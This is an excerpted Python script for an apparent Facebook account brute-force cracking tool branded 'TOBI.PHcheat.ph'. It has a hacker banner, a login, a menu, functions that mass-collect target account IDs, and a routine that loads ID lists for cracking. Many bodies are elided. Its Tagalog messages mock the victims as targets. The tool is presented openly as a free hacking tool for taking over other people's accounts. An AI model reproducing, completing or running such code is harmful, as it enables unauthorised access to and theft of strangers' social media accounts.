...
def banner():
	clear()
	sol()
	ban='''TOBI.PHcheat.ph © Brute forse Facebook account
▄▄▄▄· ▄▄▄  ▄• ▄▌▄▄▄▄▄▄▄▄ .    ·▄▄▄▄▄▄▄· ©   
▐█ ▀█▪▀▄ █·█▪██▌•██  ▀▄.▀·    ▐▄▄·▐█ ▀█▪. Author :TOBI.PHcheat.ph
▐█▀▀█▄▐▀▀▄ █▌▐█▌ ▐█.▪▐▀▀▪▄    ██▪ ▐█▀▀█▄. Wa +639267932793
██▄▪▐█▐█•█▌▐█▄█▌ ▐█▌·▐█▄▄▌    ██▌.██▄▪▐█. Status :TOBI Free tool🔥
·▀▀▀▀ .▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀     ▀▀▀ ·▀▀▀▀ '''
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t©©😛 TOBI.PHcheat.ph [green]HACKER[white] 😛©©'))
		...
		print(f'  {x}[{h}•{x}]{h} matagumpay ang pag login.........!{x} ');time.sleep(1)
		exit()
	except Exception as e:
...
def menu(my_name,my_id):
	...
	print('├──> 6. Share FB post ')
	print('├──> 0. exit mona t**** ka kasi       ')
	print('|')
...
def error():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/TOBI.PHcheat.ph")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print(f'>> 1. Your {h}OK{x} Results ')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('├──> lagay mo kung ilan target mo 🎯 : '))
	except ValueError:
	...
	for userr in uid:
		try:
			...
			print('├──> ayusin yong Signal mo  ')
			exit()
	try:
		print('|')
		print(f'├──> ang iyong mga na collect na id galing sa bobo mong target🔥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('├──> mahina ang signal ')
		back()
	except (KeyError,IOError):
		print(f'├──>{k} naka mutual ang target mo {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
...
def crack_file():
	...
	if len(vin)==0:
		...
		try:lin = open('/sdcard/ALVINO-DUMP/'+geh,'r').read().splitlines()
			...
			print('├──> hoy File Not Found, Try Again ')
			time.sleep(2)
			back()
		for xid in lin:
			id.append(xid)
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/TobiPHcheat')
	except:pass
	...
	alvino_xy(f'\n\t{x}——> {h}👋hello mga ka terminal hackers my name is TOBI.PHcheat.ph\n\t{x}——> {h}call us master out of respect\n\t{x}——> {h}1st master @Justine M. Lihay Lihay\n\t{x}——> {h}2nd Master @NICK HACKZ\n\t{x}——> {h}3rd master @Carl Centino {x}')
	time.sleep(3)
	login()
